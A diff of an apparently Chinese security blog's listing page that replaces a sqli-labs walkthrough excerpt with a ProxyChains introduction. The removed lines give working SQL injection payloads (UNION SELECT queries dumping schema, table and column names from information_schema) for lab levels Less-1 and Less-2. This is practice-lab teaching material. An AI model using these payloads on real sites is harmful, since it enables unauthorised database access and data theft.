@@ -230,30 +230,20 @@ July 20, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;DaChui
 <article class="post-entry tag-entry">
 <header class=entry-header>
 <h2>
-sqli-labs
+ProxyChains
 </h2>
 </header>
 <section class=entry-content>
-<p>Less-1 传入id=1，页面正常回显，传入id=1'页面报错。分别传参id=1' and 1=1和id=1' and 1=2，页面回显正常，判断为字符型注入。
-接下来使用联合查询看看有几列数据:id=-1'union select 1,2,3--+，这是两条语句，先让前面为-1为假，执行后面的联合查询语句，测试有几列数据，测试出来有3列数据，其中第2、3位为显示位，可进行联合查询注入。
-查看当前数据库名:id=-1'union select 1,database(),3--+
-爆库名:id=-1'union select 1,database(),group_concat(schema_name) from information_schema.schemata--+
-爆表名:id=-1'union select 1,database(),group_concat(table_name) from information_schema.tables where table_name=database()--+
-爆字段:id=-1'union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=database()--+
-Less-2 传入id=1 and 1=1页面正常，id=1 and 1=2页面无回显，判断为数字型注入。
-使用id=-1 order by语句测试有几列数据，当id=-1 order by 4时页面报错，所以有3列数据。
-使用联合查询语句id=-1 union select 1,2,3判断是否有回显位，2、3为回显位。
-查看当前数据库名:id=-1 union select 1,database(),3
-爆库名:id=-1 union select 1,database(),group_concat(schema_name) from information_schema.schemata
-后续操作跟前一关一样。
-本文链接:sqli-labs | Atmet (oopsdc.tk)
-文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
-</p>
+<p>概述 ProxyChains是一个Linux和Unix下的代理工具，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器，且可配置多个代理。
+ProxyChains通过用户自定义的代理列表强制连接指定的应用程序。
+本文简述kali下如何通过ProxyChains使用Windows主机代理。
+相关资料 GitHub项目地址 ProxyChains:haad/proxychains: proxychains - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: “user/pass” for SOCKS4/5, “basic” for HTTP. (github.com)
+ProxyChains-ng:rofl0r/proxychains-ng: proxychains ng (new generation) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project....</p>
 </section>
 <footer class=entry-footer>
-July 10, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;DaChui
+July 9, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;DaChui
 </footer>
-<a class=entry-link aria-label="post link to sqli-labs" href=https://oopsdc.tk/post/sqli-labs/></a>
+<a class=entry-link aria-label="post link to ProxyChains" href=https://oopsdc.tk/post/proxychains/></a>
 </article>
 <footer class=page-footer>
 <nav class=pagination>
